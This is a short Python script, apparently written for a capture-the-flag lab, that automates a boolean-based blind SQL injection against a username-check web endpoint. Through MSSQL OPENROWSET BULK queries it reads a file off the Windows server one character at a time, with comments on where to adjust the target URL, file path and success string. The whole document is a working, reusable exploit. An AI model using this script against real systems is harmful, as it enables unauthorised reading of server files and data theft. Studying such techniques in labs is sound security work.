#!/usr/bin/python3
import httplib2, string

#Adjust to the desired filepath to exfil
file_path = "C:\\Windows\\System32\\flag.txt"
flag = ""
l = 0
#Adjust to the victim URL
URL = "http://10.129.196.75/api/check-username.php?u="
http = httplib2.Http()

#Adjust if you need bigger, first find the file lenght
for i in range(100): 
    #Adjust the URL encoded params in the body
    params = "maria' AND (SELECT LEN(BulkColumn) FROM OPENROWSET(BULK '%s', SINGLE_CLOB) AS Contents)=%s-- -" %(file_path, i) 
    send = http.request(str(URL+params))[1]
    #Adjust the success message, in this case since maria=always true the other condition must be true in other to get TRUE=taken and stop the cycle 
    if ("taken" in send.decode()): 
        l = i 
        break 
print("[+] File length: " + str(l)) 

#Substring extract 
for i in range(1, l + 1):
    #Use ASCII values for better matching 
    for al in range(32,127):
        #Adjust the URL encoded params in the body
        params = "maria' AND ASCII((SELECT SUBSTRING(BulkColumn,%s,1) FROM OPENROWSET(BULK '%s', SINGLE_CLOB) AS Contents))=%s-- -" %(i, file_path, al)
        send = http.request(str(URL+params))[1]
        #Adjust the success message, in this case will be taken when both condition are TRUE as Maria exist and is always true and second will get true if the char=al
        if ("taken" in send.decode()): 
            flag += chr(al)
            print("[+] Flag: " + flag) 
            break

